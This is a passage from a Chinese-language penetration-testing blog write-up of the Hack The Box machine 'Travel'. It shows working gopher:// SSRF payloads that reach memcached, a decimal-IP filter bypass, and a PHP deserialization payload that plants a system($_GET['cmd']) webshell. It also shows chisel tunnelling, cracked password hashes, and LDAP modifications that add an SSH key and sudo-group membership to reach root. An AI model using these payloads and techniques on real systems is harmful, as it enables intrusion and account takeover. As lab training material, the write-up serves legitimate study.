+<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">┌──(mikannse㉿kali)-[~/tools/web/Gopherus]</span><br><span class="line">└─$ ./gopherus.py --exploit phpmemcache</span><br><span class="line"></span><br><span class="line">                                                                                                     </span><br><span class="line">  ________              .__                                                                          </span><br><span class="line"> /  _____/  ____ ______ |  |__   ___________ __ __  ______                                           </span><br><span class="line">/   \  ___ /  _ \\____ \|  |  \_/ __ \_  __ \  |  \/  ___/                                           </span><br><span class="line">\    \_\  (  &lt;_&gt; )  |_&gt; &gt;   Y  \  ___/|  | \/  |  /\___ \                                            </span><br><span class="line"> \______  /\____/|   __/|___|  /\___  &gt;__|  |____//____  &gt;                                           </span><br><span class="line">        \/       |__|        \/     \/                 \/                                            </span><br><span class="line">                                                                                                     </span><br><span class="line">                author: $_SpyD3r_$                                                                   </span><br><span class="line">                                                                                                     </span><br><span class="line"></span><br><span class="line">This is usable when you know Class and Variable name used by user</span><br><span class="line"></span><br><span class="line">Give serialization payload</span><br><span class="line">example: O:5:<span class="string">"Hello"</span>:0:{}   : <span class="built_in">test</span> payload                                                           </span><br><span class="line"></span><br><span class="line">Your gopher <span class="built_in">link</span> is ready to <span class="keyword">do</span> SSRF :                                                               </span><br><span class="line">                                                                                                     </span><br><span class="line">gopher://127.0.0.1:11211/_%0d%0aset%20SpyD3r%204%200%2012%0d%0atest%20payload%0d%0a</span><br><span class="line"></span><br><span class="line">After everything <span class="keyword">done</span>, you can delete memcached item by using this payload:                          </span><br><span class="line">                                                                                                     </span><br><span class="line">gopher://127.0.0.1:11211/_%0d%0adelete%20SpyD3r%0d%0a</span><br><span class="line"></span><br><span class="line">-----------Made-by-SpyD3r-----------</span><br></pre></td></tr></tbody></table></figure>
+
+<p>但还有一个问题是在template.php中ssrf的127.0.0.1的过滤，但是可以利用16进制表示IP来绕过,先测试一下</p>
+<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">┌──(mikannse㉿kali)-[~/tools/web/Gopherus]</span><br><span class="line">└─$ curl -s <span class="string">'http://blog.travel.htb/awesome-rss/?custom_feed_url=gopher://2130706433:11211/_%0d%0aset%20SpyD3r%204%200%2012%0d%0atest%20payload%0d%0a'</span></span><br></pre></td></tr></tbody></table></figure>
+
+<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">┌──(mikannse㉿kali)-[~/tools/web/Gopherus]</span><br><span class="line">└─$ curl -s <span class="string">'http://blog.travel.htb/awesome-rss/?debug'</span> | grep <span class="string">'^| '</span></span><br><span class="line">| SpyD3r | <span class="built_in">test</span> payload |</span><br></pre></td></tr></tbody></table></figure>
+
+<p>利用之前的templatehelper类编写一个写入webshell的payload:</p>
+<figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TemplateHelper</span></span></span><br><span class="line"><span class="class"></span>{</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$data</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>{</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;file = <span class="string">'shell.php'</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;data = <span class="string">'&lt;?php system($_GET["cmd"]); ?&gt;'</span>;</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"><span class="variable">$obj</span> = <span class="keyword">new</span> <span class="title class_">TemplateHelper</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$obj</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></tbody></table></figure>
+
+<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">┌──(mikannse㉿kali)-[~/HTB/travel]</span><br><span class="line">└─$ php 1.php </span><br><span class="line">O:14:<span class="string">"TemplateHelper"</span>:2:{s:4:<span class="string">"file"</span>;s:9:<span class="string">"shell.php"</span>;s:4:<span class="string">"data"</span>;s:30:<span class="string">"&lt;?php system(<span class="variable">$_GET</span>["</span>cmd<span class="string">"]); ?&gt;"</span>;} </span><br></pre></td></tr></tbody></table></figure>
+
+<p>那么要怎么触发反序列化呢，也就是wakeup方法。当simplepie尝试访问的url在缓存中就会触发。所以要写入的payload中的前面的哈希需要操控。先生成payload</p>
+<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">┌──(mikannse㉿kali)-[~/tools/web/Gopherus]</span><br><span class="line">└─$ ./gopherus.py --exploit phpmemcache</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  ________              .__</span><br><span class="line"> /  _____/  ____ ______ |  |__   ___________ __ __  ______</span><br><span class="line">/   \  ___ /  _ \\____ \|  |  \_/ __ \_  __ \  |  \/  ___/</span><br><span class="line">\    \_\  (  &lt;_&gt; )  |_&gt; &gt;   Y  \  ___/|  | \/  |  /\___ \</span><br><span class="line"> \______  /\____/|   __/|___|  /\___  &gt;__|  |____//____  &gt;</span><br><span class="line">        \/       |__|        \/     \/                 \/</span><br><span class="line"></span><br><span class="line">                author: $_SpyD3r_$</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">This is usable when you know Class and Variable name used by user</span><br><span class="line"></span><br><span class="line">Give serialization payload</span><br><span class="line">example: O:5:<span class="string">"Hello"</span>:0:{}   : O:14:<span class="string">"TemplateHelper"</span>:2:{s:4:<span class="string">"file"</span>;s:9:<span class="string">"shell.php"</span>;s:4:<span class="string">"data"</span>;s:30:<span class="string">"&lt;?php system(<span class="variable">$_GET</span>["</span>cmd<span class="string">"]); ?&gt;"</span>;} </span><br><span class="line"></span><br><span class="line">Your gopher <span class="built_in">link</span> is ready to <span class="keyword">do</span> SSRF :                                                               </span><br><span class="line">                                                                                                     </span><br><span class="line">gopher://127.0.0.1:11211/_%0d%0aset%20SpyD3r%204%200%20103%0d%0aO:14:%22TemplateHelper%22:2:%7Bs:4:%22file%22%3Bs:9:%22shell.php%22%3Bs:4:%22data%22%3Bs:30:%22%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%20%3F%3E%22%3B%7D%20%0d%0a</span><br><span class="line"></span><br><span class="line">After everything <span class="keyword">done</span>, you can delete memcached item by using this payload:                          </span><br><span class="line">                                                                                                     </span><br><span class="line">gopher://127.0.0.1:11211/_%0d%0adelete%20SpyD3r%0d%0a</span><br><span class="line"></span><br><span class="line">-----------Made-by-SpyD3r-----------</span><br></pre></td></tr></tbody></table></figure>
+
+<p>将payload进行url解码的结果是:</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">set SpyD3r 4 0 103</span><br><span class="line">O:14:"TemplateHelper":2:{s:4:"file";s:9:"shell.php";s:4:"data";s:30:"&lt;?php system($_GET["cmd"]); ?&gt;";} </span><br></pre></td></tr></tbody></table></figure>
+
+<p>只需要将SpyD3r(这个工具的作者)改成所访问的url的哈希就可以,这个路由是可以随便填的，那么就本地开一个web服务器来作为路由</p>
+<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">┌──(mikannse㉿kali)-[~/HTB/travel]</span><br><span class="line">└─$ python -m http.server</span><br><span class="line">Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...</span><br></pre></td></tr></tbody></table></figure>
+
+<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">┌──(mikannse㉿kali)-[~/HTB/travel]</span><br><span class="line">└─$ <span class="built_in">echo</span> -n <span class="string">"<span class="subst">$(echo -n 'http://10.10.14.13:8000/' | md5sum | cut -d' ' -f1)</span>:spc"</span> | <span class="built_in">md5sum</span></span><br><span class="line">9e80b1122657c41da80bc26babf4758b  -</span><br></pre></td></tr></tbody></table></figure>
+
+<p>那么只需要将SpyD3r改成xct_9e80b1122657c41da80bc26babf4758b就行,那么传入的payload应当是:</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">gopher://2130706433:11211/_%0d%0aset%20xct_9e80b1122657c41da80bc26babf4758b%204%200%20103%0d%0aO:14:%22TemplateHelper%22:2:%7Bs:4:%22file%22%3Bs:9:%22shell.php%22%3Bs:4:%22data%22%3Bs:30:%22%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%20%3F%3E%22%3B%7D%20%0d%0a</span><br></pre></td></tr></tbody></table></figure>
+
+<p>写入序列化字符串到memcache:</p>
+<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">┌──(mikannse㉿kali)-[~]</span><br><span class="line">└─$ curl -s <span class="string">'http://blog.travel.htb/awesome-rss/?custom_feed_url=gopher://2130706433:11211/_%0d%0aset%20xct_9e80b1122657c41da80bc26babf4758b%204%200%20103%0d%0aO:14:%22TemplateHelper%22:2:%7Bs:4:%22file%22%3Bs:9:%22shell.php%22%3Bs:4:%22data%22%3Bs:30:%22%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%20%3F%3E%22%3B%7D%20%0d%0a'</span>&gt;/dev/null</span><br></pre></td></tr></tbody></table></figure>
+
+<p>然后触发反序列化:</p>
+<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">┌──(mikannse㉿kali)-[~]</span><br><span class="line">└─$ curl -s <span class="string">'http://blog.travel.htb/awesome-rss/?custom_feed_url&amp;url=http://10.10.14.13:8000/'</span> &gt; /dev/null</span><br></pre></td></tr></tbody></table></figure>
+
+<p>webshell的路径是在_<em>_DIR</em>_./logs/shell.php</p>
+<p>__DIR__具体可以在之前.git仓库中的README看到是wp-content/themes/twentytwenty</p>
+<p>那么webshell应当在 <a target="_blank" rel="noopener" href="http://blog.travel.htb/wp-content/themes/twentytwenty/logs/shell.php">http://blog.travel.htb/wp-content/themes/twentytwenty/logs/shell.php</a></p>
+<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">┌──(mikannse㉿kali)-[~]</span><br><span class="line">└─$ curl <span class="string">'http://blog.travel.htb/wp-content/themes/twentytwenty/logs/shell.php?cmd=whoami'</span></span><br><span class="line">www-data</span><br></pre></td></tr></tbody></table></figure>
+
+<p>成功!!</p>
+<p>做一个反弹shell</p>
+<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>看一下ip发现竟然在容器当中,在wp-config.php得到数据库凭证</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">/** MySQL database username */</span><br><span class="line">define( 'DB_USER', 'wp' );</span><br><span class="line"></span><br><span class="line">/** MySQL database password */</span><br><span class="line">define( 'DB_PASSWORD', 'fiFtDDV9LYe8Ti' );</span><br></pre></td></tr></tbody></table></figure>
+
+<p>但由于shell不完整，机器上也没有python,为了连接数据库那只能做端口转发了</p>
+<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">┌──(mikannse㉿kali)-[~/HTB/travel]</span><br><span class="line">└─$ ./chisel server -p 10000 --reverse                  </span><br><span class="line">2024/09/12 19:15:34 server: Reverse tunnelling enabled</span><br><span class="line">2024/09/12 19:15:34 server: Fingerprint maha+AY0Cl6xcZuNtZFb+EIgAoGvCza/5/AJV7DEhKY=</span><br><span class="line">2024/09/12 19:15:34 server: Listening on http://0.0.0.0:10000</span><br></pre></td></tr></tbody></table></figure>
+
+<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">www-data@blog:/tmp$ ./chisel client 10.10.14.13:10000 R:3306:127.0.0.1:3306 &amp;</span><br><span class="line">./chisel client 10.10.14.13:10000 R:3306:127.0.0.1:3306 &amp;</span><br><span class="line">[1] 442</span><br><span class="line">www-data@blog:/tmp$ 2024/09/12 11:05:51 client: Connecting to ws://10.10.14.13:10000</span><br><span class="line">2024/09/12 11:05:52 client: Connected (Latency 64.784414ms)</span><br></pre></td></tr></tbody></table></figure>
+
+<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">┌──(mikannse㉿kali)-[~]</span><br><span class="line">└─$ mysql -h 10.10.14.13 -p3306 -uwp -p --skip-ssl</span><br><span class="line">Enter password: </span><br><span class="line">Welcome to the MariaDB monitor.  Commands end with ; or \g.</span><br><span class="line">Your MariaDB connection <span class="built_in">id</span> is 5212</span><br><span class="line">Server version: 10.3.22-MariaDB-0+deb10u1 Debian 10</span><br><span class="line"></span><br><span class="line">Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.</span><br><span class="line"></span><br><span class="line">Support MariaDB developers by giving a star at https://github.com/MariaDB/server</span><br><span class="line">Type <span class="string">'help;'</span> or <span class="string">'\h'</span> <span class="keyword">for</span> <span class="built_in">help</span>. Type <span class="string">'\c'</span> to clear the current input statement.</span><br><span class="line"></span><br><span class="line">MariaDB [(none)]&gt; </span><br></pre></td></tr></tbody></table></figure>
+
+<p>得到:</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">admin      | $P$BIRXVj/ZG0YRiBH8gnRy0chBx67WuK/</span><br></pre></td></tr></tbody></table></figure>
+
+<p>但是rockyou跑不出来，但是发现/opt里面还有一个wordpress,里面有一个sql文件的备份</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">/*!40000 ALTER TABLE `wp_users` DISABLE KEYS */;</span><br><span class="line">INSERT INTO `wp_users` VALUES (1,'admin','$P$BIRXVj/ZG0YRiBH8gnRy0chBx67WuK/','admin','admin@travel.htb','http://localhost','2020-04-13 13:19:01','',0,'admin'),(2,'lynik-admin','$P$B/wzJzd3pj/n7oTe2GGpi5HcIl4ppc.','lynik-admin','lynik@travel.htb','','2020-04-13 13:36:18','',0,'Lynik Schmidt');</span><br><span class="line">/*!40000 ALTER TABLE `wp_users` ENABLE KEYS */;</span><br></pre></td></tr></tbody></table></figure>
+
+<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">┌──(mikannse㉿kali)-[~/HTB/travel]</span><br><span class="line">└─$ <span class="built_in">echo</span> <span class="string">'$P$B/wzJzd3pj/n7oTe2GGpi5HcIl4ppc.'</span>&gt;<span class="built_in">hash</span></span><br><span class="line">                                                                                                     </span><br><span class="line">┌──(mikannse㉿kali)-[~/HTB/travel]</span><br><span class="line">└─$ john --wordlist=/usr/share/wordlists/rockyou.txt <span class="built_in">hash</span></span><br><span class="line">Using default input encoding: UTF-8</span><br><span class="line">Loaded 1 password <span class="built_in">hash</span> (phpass [phpass ($P$ or $H$) 256/256 AVX2 8x3])</span><br><span class="line">Cost 1 (iteration count) is 8192 <span class="keyword">for</span> all loaded hashes</span><br><span class="line">Will run 4 OpenMP threads</span><br><span class="line">Press <span class="string">'q'</span> or Ctrl-C to abort, almost any other key <span class="keyword">for</span> status</span><br><span class="line">1stepcloser      (?)     </span><br><span class="line">1g 0:00:00:15 DONE (2024-09-12 19:24) 0.06591g/s 48170p/s 48170c/s 48170C/s 1stuna..1lovemac</span><br><span class="line">Use the <span class="string">"--show --format=phpass"</span> options to display all of the cracked passwords reliably</span><br><span class="line">Session completed. </span><br></pre></td></tr></tbody></table></figure>
+
+<p>得到lynik-admin:1stepcloser,ssh直接登录，发现内网还开了35467端口</p>
+<p>家目录有一个.ldaprc,看上去是ldap客户端的配置文件，并且服务器似乎是开在一个容器当中</p>
+<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">lynik-admin@travel:~$ ping ldap.travel.htb</span><br><span class="line">PING ldap.travel.htb (172.20.0.10) 56(84) bytes of data.</span><br><span class="line">64 bytes from ldap.travel.htb (172.20.0.10): icmp_seq=1 ttl=64 time=0.063 ms</span><br><span class="line">64 bytes from ldap.travel.htb (172.20.0.10): icmp_seq=2 ttl=64 time=0.040 ms</span><br><span class="line">64 bytes from ldap.travel.htb (172.20.0.10): icmp_seq=3 ttl=64 time=0.050 ms</span><br></pre></td></tr></tbody></table></figure>
+
+<p>除此之外在.viminfo中还能找到已被删除的bind连接ldap所用的密码:Theroadlesstraveled,查询上面的所有对象</p>
+<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">lynik-admin@travel:~$ ldapsearch -x -h 172.20.0.10 -b <span class="string">"dc=travel,dc=htb"</span> -D <span class="string">"cn=lynik-admin,dc=travel,dc=htb"</span> -w Theroadlesstraveled <span class="string">"(objectClass=*)"</span> *</span><br><span class="line"><span class="comment"># extended LDIF</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># LDAPv3</span></span><br><span class="line"><span class="comment"># base &lt;dc=travel,dc=htb&gt; with scope subtree</span></span><br><span class="line"><span class="comment"># filter: (objectClass=*)</span></span><br><span class="line"><span class="comment"># requesting: user.txt </span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># travel.htb</span></span><br><span class="line">dn: dc=travel,dc=htb</span><br><span class="line"></span><br><span class="line"><span class="comment"># admin, travel.htb</span></span><br><span class="line">dn: cn=admin,dc=travel,dc=htb</span><br><span class="line"></span><br><span class="line"><span class="comment"># servers, travel.htb</span></span><br><span class="line">dn: ou=servers,dc=travel,dc=htb</span><br><span class="line"></span><br><span class="line"><span class="comment"># lynik-admin, travel.htb</span></span><br><span class="line">dn: cn=lynik-admin,dc=travel,dc=htb</span><br><span class="line"></span><br><span class="line"><span class="comment"># workstations, travel.htb</span></span><br><span class="line">dn: ou=workstations,dc=travel,dc=htb</span><br><span class="line"></span><br><span class="line"><span class="comment"># linux, servers, travel.htb</span></span><br><span class="line">dn: ou=linux,ou=servers,dc=travel,dc=htb</span><br><span class="line"></span><br><span class="line"><span class="comment"># windows, servers, travel.htb</span></span><br><span class="line">dn: ou=windows,ou=servers,dc=travel,dc=htb</span><br><span class="line"></span><br><span class="line"><span class="comment"># users, linux, servers, travel.htb</span></span><br><span class="line">dn: ou=<span class="built_in">users</span>,ou=linux,ou=servers,dc=travel,dc=htb</span><br><span class="line"></span><br><span class="line"><span class="comment"># groups, linux, servers, travel.htb</span></span><br><span class="line">dn: ou=<span class="built_in">groups</span>,ou=linux,ou=servers,dc=travel,dc=htb</span><br><span class="line"></span><br><span class="line"><span class="comment"># jane, users, linux, servers, travel.htb</span></span><br><span class="line">dn: uid=jane,ou=<span class="built_in">users</span>,ou=linux,ou=servers,dc=travel,dc=htb</span><br><span class="line"></span><br><span class="line"><span class="comment"># brian, users, linux, servers, travel.htb</span></span><br><span class="line">dn: uid=brian,ou=<span class="built_in">users</span>,ou=linux,ou=servers,dc=travel,dc=htb</span><br><span class="line"></span><br><span class="line"><span class="comment"># frank, users, linux, servers, travel.htb</span></span><br><span class="line">dn: uid=frank,ou=<span class="built_in">users</span>,ou=linux,ou=servers,dc=travel,dc=htb</span><br><span class="line"></span><br><span class="line"><span class="comment"># jerry, users, linux, servers, travel.htb</span></span><br><span class="line">dn: uid=jerry,ou=<span class="built_in">users</span>,ou=linux,ou=servers,dc=travel,dc=htb</span><br><span class="line"></span><br><span class="line"><span class="comment"># lynik, users, linux, servers, travel.htb</span></span><br><span class="line">dn: uid=lynik,ou=<span class="built_in">users</span>,ou=linux,ou=servers,dc=travel,dc=htb</span><br><span class="line"></span><br><span class="line"><span class="comment"># edward, users, linux, servers, travel.htb</span></span><br><span class="line">dn: uid=edward,ou=<span class="built_in">users</span>,ou=linux,ou=servers,dc=travel,dc=htb</span><br><span class="line"></span><br><span class="line"><span class="comment"># eugene, users, linux, servers, travel.htb</span></span><br><span class="line">dn: uid=eugene,ou=<span class="built_in">users</span>,ou=linux,ou=servers,dc=travel,dc=htb</span><br><span class="line"></span><br><span class="line"><span class="comment"># gloria, users, linux, servers, travel.htb</span></span><br><span class="line">dn: uid=gloria,ou=<span class="built_in">users</span>,ou=linux,ou=servers,dc=travel,dc=htb</span><br><span class="line"></span><br><span class="line"><span class="comment"># johnny, users, linux, servers, travel.htb</span></span><br><span class="line">dn: uid=johnny,ou=<span class="built_in">users</span>,ou=linux,ou=servers,dc=travel,dc=htb</span><br><span class="line"></span><br><span class="line"><span class="comment"># louise, users, linux, servers, travel.htb</span></span><br><span class="line">dn: uid=louise,ou=<span class="built_in">users</span>,ou=linux,ou=servers,dc=travel,dc=htb</span><br><span class="line"></span><br><span class="line"><span class="comment"># christopher, users, linux, servers, travel.htb</span></span><br><span class="line">dn: uid=christopher,ou=<span class="built_in">users</span>,ou=linux,ou=servers,dc=travel,dc=htb</span><br><span class="line"></span><br><span class="line"><span class="comment"># domainusers, groups, linux, servers, travel.htb</span></span><br><span class="line">dn: cn=domainusers,ou=<span class="built_in">groups</span>,ou=linux,ou=servers,dc=travel,dc=htb</span><br><span class="line"></span><br><span class="line"><span class="comment"># search result</span></span><br><span class="line">search: 2</span><br><span class="line">result: 0 Success</span><br><span class="line"></span><br><span class="line"><span class="comment"># numResponses: 22</span></span><br><span class="line"><span class="comment"># numEntries: 21</span></span><br></pre></td></tr></tbody></table></figure>
+
+<p>但是没有什么用,当查看ssh_config时，有别的结果</p>
+<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">lynik-admin@travel:~$ <span class="built_in">cat</span> /etc/ssh/sshd_config | grep -v <span class="string">'^#'</span> | grep . </span><br><span class="line">Include /etc/ssh/sshd_config.d/*.conf</span><br><span class="line">AuthorizedKeysCommand /usr/bin/sss_ssh_authorizedkeys</span><br><span class="line">AuthorizedKeysCommandUser nobody</span><br><span class="line">ChallengeResponseAuthentication no</span><br><span class="line">UsePAM <span class="built_in">yes</span></span><br><span class="line">X11Forwarding <span class="built_in">yes</span></span><br><span class="line">PrintMotd no</span><br><span class="line">AcceptEnv LANG LC_*</span><br><span class="line">Subsystem sftp  /usr/lib/openssh/sftp-server</span><br><span class="line">PasswordAuthentication no</span><br><span class="line">Match User trvl-admin,lynik-admin</span><br><span class="line">        PasswordAuthentication <span class="built_in">yes</span></span><br></pre></td></tr></tbody></table></figure>
+
+<p>可以利用/usr/bin/sss_ssh_authorizedkeys来查看用户的公钥,那么能够通过ldap将kali的公钥写到一个用户中，就能连接这个用户了</p>
+<p>创建一个ldif文件:</p>
+<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">lynik-admin@travel:/tmp$ <span class="built_in">cat</span> ssh.ldif </span><br><span class="line">dn: uid=johnny,ou=<span class="built_in">users</span>,ou=linux,ou=servers,dc=travel,dc=htb</span><br><span class="line">changeType: modify</span><br><span class="line">add: objectClass</span><br><span class="line">objectClass: ldapPublicKey</span><br><span class="line">-</span><br><span class="line">add: sshPublicKey</span><br><span class="line">sshPublicKey: ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFIgMc9PZn06GOz/V2GQ6aGKeqW+XoM9c80QdGimbPCL mikannse@kali</span><br></pre></td></tr></tbody></table></figure>
+
+<p>然后添加条目:</p>
+<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">lynik-admin@travel:/tmp$ ldapmodify -x -h ldap.travel.htb -D <span class="string">"cn=lynik-admin,dc=travel,dc=htb"</span> -w Theroadlesstraveled -f /tmp/ssh.ldif</span><br><span class="line">modifying entry <span class="string">"uid=johnny,ou=users,ou=linux,ou=servers,dc=travel,dc=htb"</span></span><br><span class="line"></span><br><span class="line">lynik-admin@travel:/tmp$ /usr/bin/sss_ssh_authorizedkeys johnny</span><br><span class="line">ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFIgMc9PZn06GOz/V2GQ6aGKeqW+XoM9c80QdGimbPCL mikannse@kali</span><br></pre></td></tr></tbody></table></figure>
+
+<p>发现johnny这个用户有公钥了,在kali本地能够ssh上去,接下来要做的是给这个用户添加ssh密码和添加到sudo组</p>
+<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">lynik-admin@travel:/tmp$ <span class="built_in">cat</span> sudo.ldif </span><br><span class="line">dn: uid=johnny,ou=<span class="built_in">users</span>,ou=linux,ou=servers,dc=travel,dc=htb</span><br><span class="line">changeType: modify</span><br><span class="line">replace: gidNumber</span><br><span class="line">gidNumber: 27</span><br></pre></td></tr></tbody></table></figure>
+
+<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">lynik-admin@travel:/tmp$ ldapmodify -x -h ldap.travel.htb -D <span class="string">"cn=lynik-admin,dc=travel,dc=htb"</span> -w Theroadlesstraveled -f /tmp/sudo.ldif</span><br><span class="line">modifying entry <span class="string">"uid=johnny,ou=users,ou=linux,ou=servers,dc=travel,dc=htb"</span></span><br></pre></td></tr></tbody></table></figure>
+
+<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">lynik-admin@travel:/tmp$ <span class="built_in">cat</span> pass.ldif </span><br><span class="line">dn: uid=johnny,ou=<span class="built_in">users</span>,ou=linux,ou=servers,dc=travel,dc=htb</span><br><span class="line">changeType: modify</span><br><span class="line">replace: userPassword</span><br><span class="line">userPassword: hacker</span><br></pre></td></tr></tbody></table></figure>
+
+<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">lynik-admin@travel:/tmp$ ldapmodify -x -h ldap.travel.htb -D <span class="string">"cn=lynik-admin,dc=travel,dc=htb"</span> -w Theroadlesstraveled -f /tmp/pass.ldif</span><br><span class="line">modifying entry <span class="string">"uid=johnny,ou=users,ou=linux,ou=servers,dc=travel,dc=htb"</span></span><br></pre></td></tr></tbody></table></figure>
+
+<p>现在，我们是root!</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">johnny@travel:~$ sudo su</span><br><span class="line">[sudo] password for johnny: </span><br><span class="line">root@travel:/home@TRAVEL/johnny# id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br></pre></td></tr></tbody></table></figure>
+
+<h1 id="碎碎念"><a href="#碎碎念" class="headerlink" title="碎碎念"></a>碎碎念</h1><p>本想随便挑一个反序列化房间打打的，结果挑了个地狱难度的，可以说是所有打过的靶机难度数一数二的了。但没办法自己选的跪着也要做完，看着WP，然后自己本地边调试审php，也是硬啃下来了。SSRF加反序列化，还有源码审计，其实我已经偷了一点点懒没有审simplepie的源码了。内网的ldap对我也是很新的东西。</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="http://mikannse.space">Mikannse</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://mikannse.space/2024/09/12/%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95(%E4%B8%80%E5%9B%9B%E4%B8%89)%E4%B9%8BHTBTravel/">http://mikannse.space/2024/09/12/打靶记录(一四三)之HTBTravel/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://mikannse.space" target="_blank">MikannseのSekai</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a><a class="post-meta__tags" href="/tags/linux/">linux</a><a class="post-meta__tags" href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">反序列化</a><a class="post-meta__tags" href="/tags/ldap/">ldap</a></div><div class="post_share"><div class="social-share" data-image="https://s2.loli.net/2023/06/22/PMAjL6lORKa5CGy.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2024/09/12/HTBSherlockBFT/" title="HTBSherlockBFT"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">HTBSherlockBFT</div></div></a></div><div class="next-post pull-right"><a href="/2024/09/12/%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95(%E4%B8%80%E5%9B%9B%E4%BA%8C)%E4%B9%8BHTBRedCross/" title="打靶记录(一四二)之HTBRedCross"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">打靶记录(一四二)之HTBRedCross</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2024/03/27/%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95(%E4%B8%80%E4%B8%80%E4%BA%8C)%E4%B9%8BTHMDebug/" title="打靶记录(一一二)之THMDebug"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-03-27</div><div class="title">打靶记录(一一二)之THMDebug</div></div></a></div><div><a href="/2024/03/22/%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95(%E4%B8%80%E4%B8%80%E9%9B%B6)%E4%B9%8BTHMPeakHill/" title="打靶记录(一一零)之THMPeakHill"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-03-22</div><div class="title">打靶记录(一一零)之THMPeakHill</div></div></a></div><div><a href="/2024/09/05/%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95(%E4%B8%80%E4%B8%89%E4%B8%89)%E4%B9%8BHTBCanape/" title="打靶记录(一三三)之HTBCanape"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt 